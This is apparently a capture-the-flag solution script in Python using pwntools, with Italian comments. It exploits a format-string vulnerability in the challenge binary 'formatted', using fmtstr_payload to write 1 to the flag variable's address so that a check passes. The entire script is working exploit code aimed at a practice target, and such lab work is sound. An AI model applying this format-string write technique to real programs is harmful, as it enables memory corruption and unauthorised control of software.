from pwn import *
context.arch = "amd64"

if args.REMOTE:
  r = remote("formatted.challs.olicyber.it", 10305)
else:
  r = gdb.debug("./formatted", """
    b *0x401226
    continue
  """)
  
#fmtstr_payload(offset, {address: value}) serve per scrivere un valore in una certa address usando la vulnerabilità di format string %n
#usiamo fmtstr_payload per scrivere 1 in 0x40404C (address di flag), in questo modo quando viene fatto if( flag ) verrà considerato true
payload = fmtstr_payload(6, {0x40404C: 1}) # write_size='int'
print(payload, len(payload))
r.recvuntil(b"?\n")
r.sendline(payload)
print(r.recvall())